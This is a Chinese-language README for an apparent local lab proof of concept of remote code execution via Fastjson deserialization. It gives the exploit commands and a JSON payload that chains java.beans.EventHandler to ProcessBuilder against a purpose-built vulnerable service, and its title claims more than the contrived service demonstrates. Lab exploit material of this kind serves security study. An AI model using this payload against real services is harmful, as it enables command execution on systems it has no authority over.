# Fastjson 1.2.83 本机 RCE PoC

> 仅限授权本地测试。

## 目录

```text
fastjson-1.2.83-rce/
├── README.md
├── LICENSE
├── requirements.txt
├── java/
│   ├── VulnServer.java       # 本机漏洞 HTTP 服务
│   └── fastjson-1.2.83.jar
├── payloads/
│   └── payload.json          # 示例 payload
└── poc/
    ├── start_server.py       # 启动本机服务
    └── exploit.py            # 打本机服务
```

## 步骤

### 终端 1：启动本机 Fastjson 服务

```bash
cd fastjson-1.2.83-rce
python3 poc/start_server.py
```

成功输出示例：

```text
[+] Fastjson 1.2.83 vuln server started
[+] listen : http://127.0.0.1:18080
[+] parse  : POST http://127.0.0.1:18080/api/parse
```


### 终端 2：对本机服务做 RCE

```bash
cd fastjson-1.2.83-rce

# 默认 touch 标记文件
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse

# 内置简单命令
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse --cmd id
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse --cmd whoami
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse --cmd uname
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse --cmd pwd
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse --cmd touch
```

端口按终端 1 实际输出改，例如 18082：

```bash
python3 poc/exploit.py --url http://127.0.0.1:18082/api/parse --cmd id
```

### 验证

```bash
ls -la /tmp/fastjson_1_2_83_rce_marker
cat /tmp/fastjson_1_2_83_rce_marker
```

成功时 PoC 输出：

```text
[+] RCE trigger accepted by server
```

## 内置命令

| `--cmd` | 实际执行 |
|---------|----------|
| `touch` | `touch /tmp/fastjson_1_2_83_rce_marker` |
| `id` | `id > /tmp/fastjson_1_2_83_rce_marker` |
| `whoami` | `whoami > /tmp/fastjson_1_2_83_rce_marker` |
| `uname` | `uname -a > /tmp/fastjson_1_2_83_rce_marker` |
| `pwd` | `pwd > /tmp/fastjson_1_2_83_rce_marker` |

自定义：

```bash
python3 poc/exploit.py --url http://127.0.0.1:18080/api/parse --cmd 'echo pwned > /tmp/fj_pwned'
```

## 服务接口

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | `/health` | 健康检查 |
| POST | `/api/parse` | Fastjson 反序列化并触发命令 |

```bash
curl http://127.0.0.1:18080/health
```

## Payload

```json
{
  "pb": {
    "command": ["/bin/bash", "-c", "id > /tmp/fastjson_1_2_83_rce_marker"]
  },
  "handler": {
    "@type": "java.beans.EventHandler",
    "target": "PLACEHOLDER",
    "action": "start"
  }
}
```

链路简述：`DualDto{ProcessBuilder pb; InvocationHandler handler}` → EventHandler + ProcessBuilder → 代理触发 `start` → RCE。

## 环境

- JDK（`javac` / `java`）
- Python 3.9+（标准库即可）


## 免责声明

仅限本机授权安全研究，禁止用于未授权目标。
本仓库所有信息均已提交至相关公安机关备案，涉及内容已做严格脱敏处理。仓库所提及的技术均为网络安全领域的常规方法，不包含任何框架 0day 漏洞、新型攻击手段及未公开的技术细节。

请务必遵守国家法律法规及网络安全相关规定，严禁利用本仓库所述技术从事任何非法测试、攻击等危害网络安全的行为。因传播、使用本仓库信息而导致的任何直接或间接损失、法律责任，均由使用者自行承担，与作者及发布方无涉。